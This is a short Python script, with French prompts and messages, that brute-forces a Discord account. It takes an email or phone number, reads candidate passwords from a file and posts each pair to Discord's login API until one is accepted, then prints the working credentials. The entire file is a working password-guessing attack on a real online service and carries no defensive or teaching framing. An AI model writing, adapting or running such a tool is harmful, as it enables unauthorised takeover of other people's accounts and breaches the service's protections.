import requests
import string
import time

i = 1
a = 2
b = 0

username = (input("email ou téléphone --> "))


while i < a:
    line = b
    file = open('your_passwords.txt', "r")
    pass1 = file.readlines()
    password = pass1[b].replace('\n', '')
    headers = {'user-agent': 'patate connecté', 'content-type': 'application/json'}
    data={"login":username,"password":password}
    with requests.Session() as sessioncheck:
        response1 = sessioncheck.post('https://discord.com/api/v9/auth/login',json=data,headers=headers)
        reponse_final = str(response1.content)
        if 'INVALID_LOGIN' in reponse_final:
            b += 1
            b = str(b)
            print("mdp ne marche pas" + ' ' + password + ' ' + b)
            b = int(b)
            time.sleep(1)
        else:
            print(reponse_final)
            b +=1
            b = str(b)
            print(username + ':' + password + ' ' + 'a été brutforce' + ' ' + b)
            b = int(b)
            i += 1